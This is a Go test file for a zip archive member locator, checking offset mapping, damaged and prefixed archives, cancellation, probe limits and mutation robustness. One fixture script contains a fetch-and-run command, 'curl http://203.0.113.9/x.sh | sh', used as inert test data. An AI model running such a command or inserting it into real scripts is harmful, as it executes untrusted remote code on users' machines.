package archive_test

import (
	"bytes"
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/q6r/teardown/internal/format/archive"
	"github.com/q6r/teardown/internal/testfixtures"
	"github.com/q6r/teardown/internal/zipscan"
)

func locate(t *testing.T, b []byte, offsets ...int64) []*archive.Member {
	t.Helper()
	got, err := archive.Locate(context.Background(), bytes.NewReader(b), int64(len(b)), offsets)
	if err != nil {
		t.Fatalf("Locate: %v", err)
	}
	if len(got) != len(offsets) {
		t.Fatalf("%d results for %d offsets", len(got), len(offsets))
	}
	return got
}

func TestLocateFindsStoredMembers(t *testing.T) {
	script := "#!/bin/sh\ncurl http://203.0.113.9/x.sh | sh\n"
	other := "second member content"
	b := testfixtures.Zip(
		testfixtures.ZipEntry{Name: "bin/install.sh", Data: []byte(script), Store: true},
		testfixtures.ZipEntry{Name: "packed.txt", Data: bytes.Repeat([]byte("compressible "), 200)},
		testfixtures.ZipEntry{Name: "docs/other.txt", Data: []byte(other), Store: true},
		testfixtures.ZipEntry{Name: "empty/", Store: true},
	)
	scriptAt := int64(bytes.Index(b, []byte(script)))
	otherAt := int64(bytes.Index(b, []byte(other)))
	if scriptAt < 0 || otherAt < 0 {
		t.Fatal("fixture contents not found in the archive")
	}

	got := locate(t, b, scriptAt+int64(strings.Index(script, "curl")), otherAt, otherAt+int64(len(other))-1, scriptAt)
	want := []struct {
		name         string
		offset, size int64
	}{{"bin/install.sh", scriptAt, int64(len(script))}, {"docs/other.txt", otherAt, int64(len(other))}, {"docs/other.txt", otherAt, int64(len(other))}, {"bin/install.sh", scriptAt, int64(len(script))}}
	for i, w := range want {
		m := got[i]
		if m == nil || m.Name != w.name || m.Offset != w.offset || m.Size != w.size {
			t.Errorf("offset %d: got %+v, want %+v", i, m, w)
		}
	}
}

func TestLocateRefusesWhatItCannotRead(t *testing.T) {
	text := "plain stored text that is easy to find"
	packed := bytes.Repeat([]byte("compressible "), 300)
	b := testfixtures.Zip(
		testfixtures.ZipEntry{Name: "a.txt", Data: []byte(text), Store: true},
		testfixtures.ZipEntry{Name: "packed.txt", Data: packed},
	)
	textAt := int64(bytes.Index(b, []byte(text)))
	centralAt := int64(bytes.Index(b, []byte("PK\x01\x02")))
	size := int64(len(b))

	probes := []int64{
		textAt - 1,                // the last byte of the local header
		textAt + int64(len(text)), // the first byte after the content
		textAt - 20,               // inside the header
		centralAt + 10,            // the central directory
		size - 3,                  // the end record
		size, size + 100, -1,      // outside the file
		40 + int64(len(text)) + 5, // inside the compressed member
	}
	for i, m := range locate(t, b, probes...) {
		if m != nil {
			t.Errorf("offset %d (%d): got %+v, want nothing", i, probes[i], m)
		}
	}
}

func TestLocateWithoutOffsets(t *testing.T) {
	b := testfixtures.Zip(testfixtures.ZipEntry{Name: "a", Data: []byte("x"), Store: true})
	if got := locate(t, b); len(got) != 0 {
		t.Fatalf("got %v", got)
	}
}

func TestLocateFirstOverlappingMemberWins(t *testing.T) {
	b := testfixtures.ZipOverlapping()
	at := int64(bytes.Index(b, bytes.Repeat([]byte{'a'}, 200))) + 5
	got := locate(t, b, at)
	if got[0] == nil || got[0].Name != "a.bin" {
		t.Fatalf("got %+v, want the first member (a.bin)", got[0])
	}
}

func TestLocateInAnArchiveWithAPrefix(t *testing.T) {
	text := "stored text after a self-extractor stub"
	b := testfixtures.ZipWithPrefix([]byte(strings.Repeat("STUB", 100)), testfixtures.ZipEntry{Name: "x.txt", Data: []byte(text), Store: true})
	at := int64(bytes.Index(b, []byte(text)))
	got := locate(t, b, at+3)
	if got[0] == nil || got[0].Name != "x.txt" || got[0].Offset != at || got[0].Size != int64(len(text)) {
		t.Fatalf("got %+v, want x.txt at %d", got[0], at)
	}
}

func TestLocateDamagedArchives(t *testing.T) {
	text := "stored text that survives damage"
	good := testfixtures.Zip(testfixtures.ZipEntry{Name: "x.txt", Data: []byte(text), Store: true})
	at := int64(bytes.Index(good, []byte(text)))

	t.Run("cut end record: the directory is recovered from the local headers", func(t *testing.T) {
		b := testfixtures.ZipTruncatedEOCD(testfixtures.ZipEntry{Name: "x.txt", Data: []byte(text), Store: true})
		if got := locate(t, b, at+2); got[0] == nil || got[0].Name != "x.txt" {
			t.Fatalf("got %+v", got[0])
		}
	})
	t.Run("a stored size larger than the file is held to the file", func(t *testing.T) {
		b := good[:at+10] // the archive ends inside the content
		got, err := archive.Locate(context.Background(), bytes.NewReader(b), int64(len(b)), []int64{at + 5, at + 20})
		if err != nil {
			t.Fatal(err)
		}
		if got[1] != nil {
			t.Errorf("an offset past the end of the file cannot be located: %+v", got[1])
		}
		if got[0] != nil && got[0].Offset+got[0].Size > int64(len(b)) {
			t.Errorf("member %+v extends beyond the %d byte file", got[0], len(b))
		}
	})
	t.Run("not a zip", func(t *testing.T) {
		text := strings.Repeat("just text, nothing else here\n", 5)
		_, err := archive.Locate(context.Background(), strings.NewReader(text), int64(len(text)), []int64{3})
		if !errors.Is(err, zipscan.ErrNotZip) {
			t.Fatalf("err = %v, want ErrNotZip", err)
		}
	})
}

func TestLocateHonoursCancellation(t *testing.T) {
	b := testfixtures.ZipMany(5000)
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := archive.Locate(ctx, bytes.NewReader(b), int64(len(b)), []int64{100}); !errors.Is(err, context.Canceled) {
		t.Fatalf("err = %v", err)
	}
}

func TestLocateBoundsItsProbes(t *testing.T) {
	text := strings.Repeat("0123456789", 5)
	b := testfixtures.Zip(testfixtures.ZipEntry{Name: "x.txt", Data: []byte(text), Store: true})
	at := int64(bytes.Index(b, []byte(text)))
	probes := make([]int64, 1000)
	for i := range probes {
		probes[i] = at + 1
	}
	got := locate(t, b, probes...)
	found := 0
	for _, m := range got {
		if m != nil {
			found++
		}
	}
	if found != 256 {
		t.Fatalf("%d offsets were located, want the first 256 only", found)
	}
}

func TestLocateNeverPanics(t *testing.T) {
	good := testfixtures.Zip(
		testfixtures.ZipEntry{Name: "a.txt", Data: []byte("alpha alpha alpha"), Store: true},
		testfixtures.ZipEntry{Name: "b.js", Data: []byte("beta beta beta beta"), Store: true},
	)
	probes := []int64{0, 5, 30, 50, 80, 120, int64(len(good)) - 1}
	check := func(b []byte) {
		got, err := archive.Locate(context.Background(), bytes.NewReader(b), int64(len(b)), probes)
		if err == nil && len(got) != len(probes) {
			t.Fatalf("%d results", len(got))
		}
		for _, m := range got {
			if m != nil && (m.Offset < 0 || m.Size < 0 || m.Offset+m.Size > int64(len(b))) {
				t.Fatalf("member %+v lies outside the %d byte archive", m, len(b))
			}
		}
	}
	for n := 0; n <= len(good); n++ {
		check(good[:n])
	}
	for i := range good {
		for _, v := range []byte{0x00, 0xFF, 0x7F} {
			mutated := bytes.Clone(good)
			mutated[i] = v
			check(mutated)
		}
	}
}
